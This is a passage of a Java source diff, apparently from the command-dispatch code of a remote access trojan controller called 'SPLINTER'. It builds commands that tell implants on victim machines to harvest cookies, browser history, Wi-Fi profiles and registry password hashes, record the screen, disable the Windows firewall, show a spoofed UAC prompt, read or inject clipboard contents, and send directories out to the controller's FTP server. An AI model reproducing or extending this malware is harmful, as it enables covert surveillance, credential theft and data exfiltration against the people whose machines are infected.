+						Driver.sop("download file is in invalid form.  enter download \"[absolute file path on remote machine]\"");
+					}
+					
+					else if(!FTP_ServerSocket.FTP_ServerSocket_Is_Open)
+					{
+						Driver.jop("ERROR!!! it doesn't appear that the FTP Server is running");
+					}
+					
+					else
+					{
+						cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.SEND_FILE_TO_CONTROLLER + Driver.delimeter_1 + FTP_ServerSocket.FTP_Server_Address + Driver.delimeter_1 + FTP_ServerSocket.PORT + Driver.delimeter_1 + arr[1];
+						
+					}
+					
+				}
+				
+				
+				
+				else if(cmdToSend != null && cmdToSend.trim().toLowerCase().startsWith("capture screen"))
+				{										
+					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.CAPTURE_SCREEN + Driver.delimeter_1 + this.myTempPath + Driver.delimeter_1 + FTP_ServerSocket.FTP_Server_Address + Driver.delimeter_1 + FTP_ServerSocket.PORT;//to delete when done
+					
+				}
+				
+				
+				else if(cmdToSend != null && (cmdToSend.trim().toLowerCase().startsWith("stop process") || cmdToSend.trim().equalsIgnoreCase(Driver.STOP_PROCESS)))
+				{										
+					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.STOP_PROCESS;
+					
+				}
+				
+				
+								
+				
+				
+				else if(cmdToSend != null && cmdToSend.equalsIgnoreCase(Driver.ENUMERATE_SYSTEM))
+				{										
+					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.ENUMERATE_SYSTEM + Driver.delimeter_1 + this.myTempPath + Driver.delimeter_1 + FTP_ServerSocket.FTP_Server_Address + Driver.delimeter_1 + FTP_ServerSocket.PORT;
+					
+				}
+				
+				
+				else if(cmdToSend != null && cmdToSend.equalsIgnoreCase(Driver.HARVEST_WIRELESS_PROFILE))
+				{										
+					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.HARVEST_WIRELESS_PROFILE + Driver.delimeter_1 + this.myTempPath + Driver.delimeter_1 + FTP_ServerSocket.FTP_Server_Address + Driver.delimeter_1 + FTP_ServerSocket.PORT;
+					
+				}
+				
+				
+				else if(cmdToSend != null && cmdToSend.equalsIgnoreCase(Driver.HARVEST_COOKIES))
+				{										
+					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.HARVEST_COOKIES + Driver.delimeter_1 + this.myTempPath + Driver.delimeter_1 + FTP_ServerSocket.FTP_Server_Address + Driver.delimeter_1 + FTP_ServerSocket.PORT;
+					
+				}
+				
+				
+				else if(cmdToSend != null && cmdToSend.equalsIgnoreCase(Driver.HARVEST_BROWSER_HISTORY))
+				{										
+					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.HARVEST_BROWSER_HISTORY + Driver.delimeter_1 + this.myTempPath + Driver.delimeter_1 + FTP_ServerSocket.FTP_Server_Address + Driver.delimeter_1 + FTP_ServerSocket.PORT;
+					
+				}
+				
+				
+				else if(cmdToSend != null && cmdToSend.equalsIgnoreCase(Driver.HARVEST_REGISTRY_HASHES))
+				{										
+					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.HARVEST_REGISTRY_HASHES + Driver.delimeter_1 + this.myTempPath + Driver.delimeter_1 + FTP_ServerSocket.FTP_Server_Address + Driver.delimeter_1 + FTP_ServerSocket.PORT;
+					
+				}
+				
+				else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.RUNNING_PROCESS_LIST))
+				{										
+					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.RUNNING_PROCESS_LIST;
+					
+				}
+				
+				
+				
+				else if(cmdToSend != null && cmdToSend.trim().toLowerCase().equalsIgnoreCase("ps"))
+				{										
+					cmdToSend = "tasklist";
+					
+				}
+				
+				
+				
+				else if(cmdToSend != null && cmdToSend.trim().toLowerCase().equalsIgnoreCase("pwd"))
+				{										
+					cmdToSend = "echo %cd%";
+					
+				}
+				
+				
+				
+				else if(cmdToSend != null && cmdToSend.trim().toLowerCase().equalsIgnoreCase("ls"))
+				{										
+					cmdToSend = "dir";
+					
+				}
+				
+				
+				
+				
+				else if(cmdToSend != null && cmdToSend.trim().toLowerCase().startsWith(Driver.SPOOF_UAC.toLowerCase()))
+				{										
+					String []arr = cmdToSend.split(",");
+					if(arr.length != 3)
+					{
+						Driver.sop("spoof UAC is in invalid form. use [Spoofed Program Title], [Executable Name] next time.  e.g. " + Driver.SPOOF_UAC + ", Notepad, Notepad.exe" + ". I am sending Default Windows Update instead");
+						
+						
+																																				
+						cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.SPOOF_UAC + Driver.delimeter_1 + "null" + Driver.delimeter_1 + "null";
+					}
+					else
+					{
+																																				
+						cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 +Driver.SPOOF_UAC + Driver.delimeter_1 + arr[1] + Driver.delimeter_1 + arr[2];
+					}
+					
+					
+				}
+				
+				
+				else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.FILE_BROWSER_INITIATE))
+				{
+					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 +Driver.FILE_BROWSER_INITIATE;
+				}
+				
+				
+				else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.DISABLE_WINDOWS_FIREWALL))
+				{
+					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.DISABLE_WINDOWS_FIREWALL;
+				}
+				
+			else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.ENABLE_WINDOWS_FIREWALL))
+				{
+					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.ENABLE_WINDOWS_FIREWALL;
+				}
+				
+				else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.DISPLAY_WINDOWS_FIREWALL))
+				{
+					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.DISPLAY_WINDOWS_FIREWALL;
+				}
+				
+				else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.EXTRACT_CLIPBOARD))
+				{
+					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.EXTRACT_CLIPBOARD;
+				}
+				
+			
+				
+				else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.INJECT_CLIPBOARD))
+				{
+					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.INJECT_CLIPBOARD + Driver.delimeter_1 + " " + Drivers.jop_Query("Enter String to Inject into Clipboard: ", "Inject Into Clipboard");
+				}
+				
+				
+				
+				
+				else if(cmdToSend != null && cmdToSend.trim().toLowerCase().startsWith(Driver.ORBIT_DIRECTORY.toLowerCase()))
+				{										
+					String [] arrOrbitEntries = cmdToSend.split(",");
+					
+					if(arrOrbitEntries == null || arrOrbitEntries.length != 5)
+					{
+						Drivers.jop("Invalid parameters for Orbiter Payload. Unable to Continue!");
+						return true;
+					}
+					
+					if(!FTP_ServerSocket.FTP_ServerSocket_Is_Open)
+					{
+						Driver.jop("ERROR!!! it doesn't appear that the FTP Server is running");
+						return true;
+					}
+					
+					int delay_secs = 1000;
+					try
+					{
+						delay_secs = 1000 * Integer.parseInt(arrOrbitEntries[4].trim());
+					}catch(Exception ff)
+					{						
+						Drivers.jop("Invalid parameters for Orbiter Payload Delay interval. Unable to Continue!");
+						return true;
+					}
+															
+					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.ORBIT_DIRECTORY + Driver.delimeter_1 + arrOrbitEntries[1] + Driver.delimeter_1 + arrOrbitEntries[2] + Driver.delimeter_1 + arrOrbitEntries[3] + Driver.delimeter_1 + delay_secs + Driver.delimeter_1 + FTP_ServerSocket.FTP_Server_Address + Driver.delimeter_1 + FTP_ServerSocket.PORT;;					
+				}
+				
+				else if(cmdToSend != null && (cmdToSend.trim().toLowerCase().startsWith(Driver.DATA_EXFIL_ALERTER_PAYLOAD.toLowerCase()) || cmdToSend.trim().toLowerCase().startsWith(Driver.DATA_EXFIL_EXTRACTOR_PAYLOAD.toLowerCase()) || cmdToSend.trim().toLowerCase().startsWith(Driver.DATA_EXFIL_INJECTOR_PAYLOAD.toLowerCase()) || cmdToSend.trim().toLowerCase().startsWith(Driver.DATA_EXFIL_INSPECTOR_PAYLOAD.toLowerCase()) || cmdToSend.trim().toLowerCase().startsWith(Driver.DATA_EXFIL_SELECTOR_PAYLOAD.toLowerCase())) )
+				{										
+					String [] arrOrbitEntries = cmdToSend.split(",");
+					
+					if(arrOrbitEntries == null || arrOrbitEntries.length != 5)
+					{
+						Drivers.jop("Invalid parameters for Orbiter Payload. Unable to Continue!");
+						return true;
+					}
+					
+					if(!FTP_ServerSocket.FTP_ServerSocket_Is_Open)
+					{
+						Driver.jop("ERROR!!! it doesn't appear that the FTP Server is running");
+						return true;
+					}
+					
+					int delay_secs = 1000;
+					try
+					{
+						delay_secs = 1000 * Integer.parseInt(arrOrbitEntries[4].trim());
+					}catch(Exception ff)
+					{						
+						Drivers.jop("Invalid parameters for Orbiter Payload Delay interval. Unable to Continue!");
+						return true;
+					}
+															
+					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.ORBIT_DIRECTORY + Driver.delimeter_1 + arrOrbitEntries[1] + Driver.delimeter_1 + arrOrbitEntries[2] + Driver.delimeter_1 + arrOrbitEntries[3] + Driver.delimeter_1 + delay_secs + Driver.delimeter_1 + FTP_ServerSocket.FTP_Server_Address + Driver.delimeter_1 + FTP_ServerSocket.PORT;;					
+				}
+				
+				
+				
+				else if(cmdToSend != null && (cmdToSend.trim().toLowerCase().startsWith("halt orbiter payload") || cmdToSend.trim().toLowerCase().startsWith("stop orbit directory") || cmdToSend.trim().equalsIgnoreCase(Driver.STOP_ORBIT_DIRECTORY)))
+				{										
+					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.STOP_ORBIT_DIRECTORY;					
+				}
+				
+				
+				else if(cmdToSend != null && cmdToSend.trim().toLowerCase().startsWith(Driver.SET_WALLPAPER.toLowerCase()))
+				{										
+					String path = cmdToSend.replace(Driver.SET_WALLPAPER, "");
+					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.SET_WALLPAPER + Driver.delimeter_1 + " " + path.trim();					
+				}
+				
+				else if(cmdToSend != null && cmdToSend.trim().toLowerCase().startsWith("set wallpaper"))
+				{										
+					String path = cmdToSend.replace("set wallpaper", "");
+					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.SET_WALLPAPER + Driver.delimeter_1 + " " + path.trim();					
+				}
+				
+				else if(cmdToSend != null && cmdToSend.trim().toLowerCase().startsWith("change wallpaper"))
+				{										
+					String path = cmdToSend.replace("change wallpaper", "");
+					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.SET_WALLPAPER + Driver.delimeter_1 + " " + path.trim();					
+				}
+				
+				
+				else if(cmdToSend != null && cmdToSend.trim().toLowerCase().startsWith(Driver.EXFIL_DIRECTORY.toLowerCase()))
+				{										
+					String [] arrOrbitEntries = cmdToSend.split(",");
+					
+					if(arrOrbitEntries == null || arrOrbitEntries.length != 4)
+					{
+						Drivers.jop("Invalid parameters for Data Extraction Payload. Unable to Continue!");
+						return true;
+					}
+					
+					if(!FTP_ServerSocket.FTP_ServerSocket_Is_Open)
+					{
+						Driver.jop("ERROR!!! it doesn't appear that the FTP Server is running");
+						return true;
+					}
+							
+															
+					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.EXFIL_DIRECTORY + Driver.delimeter_1 + arrOrbitEntries[1] + Driver.delimeter_1 + arrOrbitEntries[2] + Driver.delimeter_1 + arrOrbitEntries[3] + Driver.delimeter_1 + FTP_ServerSocket.FTP_Server_Address + Driver.delimeter_1 + FTP_ServerSocket.PORT;;					
+				}
+				
+				
+				
+				else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.ENABLE_CLIPBOARD_EXTRACTOR))
+				{
+					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 +Driver.ENABLE_CLIPBOARD_EXTRACTOR;
+				}
+				
+				
+				
+				else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.ENABLE_CLIPBOARD_INJECTOR))
+				{
+					//QUERY USER FOR INJECTION TEXT
+					String injectionText = Drivers.jop_Query("Please Supply Injection Text: ", "Enter Injection Text");
+					
+					if(injectionText == null)
+						return true;
+					
+					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 +Driver.ENABLE_CLIPBOARD_INJECTOR + Driver.delimeter_1 + injectionText + " ";
+				}
+				
+				
+				
+				else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.DISABLE_CLIPBOARD_INJECTOR))
+				{
+					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 +Driver.DISABLE_CLIPBOARD_INJECTOR;
+				}
+				
+				
+				
+				else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.DISABLE_CLIPBOARD_EXTRACTOR))
+				{
+					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 +Driver.DISABLE_CLIPBOARD_EXTRACTOR;
+				}
+				
+				
+				else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.SCRAPE_SCREEN))
+				{		
+					if(!FTP_ServerSocket.FTP_ServerSocket_Is_Open)
+					{
+						Driver.jop("ERROR!!! it doesn't appear that the FTP Server is running");
+						return true;
+					}
+					
+					configureEnvironmentForScreenScrape(Driver.SCREEN_CAPTURE_DIRECTORY_NAME);
+					
+					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.SCRAPE_SCREEN + Driver.delimeter_1 + this.myTempPath + Driver.delimeter_1 + FTP_ServerSocket.FTP_Server_Address + Driver.delimeter_1 + FTP_ServerSocket.PORT;//to delete when done
+					
+					if(worker_ScreenScrape != null)
+					{
+						try	
+						{	
+							worker_ScreenScrape.killThisThread = true;  
+							
+							if(worker_ScreenScrape.screenRecord != null)
+							{
+								worker_ScreenScrape.screenRecord.dispose();
+							}
+						}catch(Exception e){Driver.sop("Exception handled attempting to dispose previous screen renderer worker thread");}
+					}
+					
+					worker_ScreenScrape = new Worker_Thread_Payloads(200, null,Worker_Thread_Payloads.PAYLOAD_RENDER_SCREEN, null, "", 1, this.fleMyScreenScrapeDirectory);
+					worker_ScreenScrape.myTerminal = this;
+					
+				}
+				
+				
+				
+				else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.DISABLE_RECORD_SCREEN))
+				{
+					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 +Driver.DISABLE_RECORD_SCREEN;
+				}
+				
+				
+				
+			}catch(Exception e){Drivers.jop_Error("Invalid value entered from shortcut command. \n\nUnable to Continue " + " Code: " + e.getLocalizedMessage(), "Unable to Send Shortcut"); return false;}
+			
+			
+			
+			
+			
+			
+			this.pwOut.println(cmdToSend);
+			this.pwOut.flush();
+			
+			try	{	Driver.logReceivedLine(false, this.getId(), " " + this.myRandomIdentifier + " ", " SPLINTER - CONTROLER ", " " + myImplantName + " ", " " + Thread_ServerSocket.ControllerIP + " ", " " + this.myVictim_RHOST_IP + " ", cmdToSend);	} catch(Exception ee){}
+			
+			return true;
+		}
+		catch(Exception e)
+		{
+			Drivers.eop("Thread ID: " + myThread_ID + " sendCommand_RAW", strMyClassName, e, e.getLocalizedMessage(), false);
+		}
+		
+		return false;
+	}
 
   public File configureEnvironmentForScreenScrape(String FolderName)
   {
